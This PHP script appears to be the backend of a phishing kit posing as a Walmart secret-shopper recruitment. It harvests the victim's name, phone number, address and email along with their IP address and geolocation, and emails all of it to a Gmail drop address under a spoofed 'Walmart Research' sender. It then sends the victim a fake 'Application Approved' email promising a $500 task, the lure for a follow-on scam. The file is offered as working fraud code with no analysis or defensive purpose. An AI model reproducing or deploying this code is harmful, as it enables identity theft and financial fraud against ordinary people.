<?php

		
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$country = "{$geoplugin->countryName}";

$message .= "|----------- Walmart Info --------------|\n";

$adddate=date("D M d, Y");

$message .= "".$_POST['phone']."|".$_POST['fullname']."\n";
$message .= "".$_POST['address']."\n".$_POST['city']." ".$_POST['state']." ".$_POST['zip']."\n";
$message .= "".$_POST['email']."\n";
$message .= "".$_POST['apartment']."\n";
$message .= "|----------- Subscriber's Info --------------|\n";
$message .= "IP Address: ".$ip."\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "Date: ".$adddate."\n";
$message .= "|----------- unknown --------------|\n";


$send = "shopper9535@gmail.com";
$subject = "Walmart Research - ".$ip;
$headers = "From: Walmart Research <helpdesk@tmfashopper.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}


$email = $_POST['email'];
$subject2 = "Application Approved  " . $adddate;
$body = "Dear ".$_POST['fullname']."<p><br>
We hereby confirm your entry as one of the prospective candidates for the role of TMFA Survey Research  Personnel. Your details have been sent to the appropriate unit for further review.<br>
<br>
You will be notified via email as soon as your first official task with $500 reward is on the way. The moment you're assigned, procedures and instructions to guide you through task will arrive in the mail within 2 weeks of registration. Endeavor to check your Text Message / Email Spam-Junk-Inbox for updates on the task.<br>
<br>
If you have any questions or concerns, don't hesitate to reply to this email or contact [ helpdesk@tmfashopper.com ]
<br>
<br>
HelpDesk<br>
TMFA Survey Research Consultants, Inc™</p>

</body>
";


$headers = "From: HelpDesk <helpdesk@tmfashopper.com>"."\n";
$headers .= "Content-type:text/html; charset=utf-8" ."\n";
mail($email,$subject2,$body,$headers);
	
		   
		  $temp=$_POST['email'];
$newURL="./index-3.php?id=".$temp;
		   header('Location: '.$newURL);

	 
?>